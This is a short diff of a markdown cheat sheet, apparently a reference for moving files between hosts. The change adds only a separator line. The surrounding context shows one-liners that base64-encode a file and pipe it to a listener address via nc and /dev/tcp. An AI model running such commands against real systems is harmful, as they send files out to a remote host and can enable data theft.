@@ -84,6 +84,8 @@ base64 -w0 file.ext | nc -q 0 %ListenerAddress% %ListeningPort%
 base64 -w0 file.ext >& /dev/tcp/%ListenerAddress%/%ListenerPort%
 ```
 
+***
+
 #### Retrieve file from host to client:
 
 ##### If you want to send the raw contents:
